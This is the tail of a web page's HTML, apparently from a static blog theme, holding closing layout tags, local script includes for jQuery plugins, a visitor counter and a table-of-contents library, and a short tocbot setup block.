</div>
</div>
  </aside>
  
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


  
<script src="/fancybox/jquery.fancybox.min.js"></script>




  
<script src="/js/tocbot.min.js"></script>

  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>



<script src="/js/ocean.js"></script>


</body>
</html>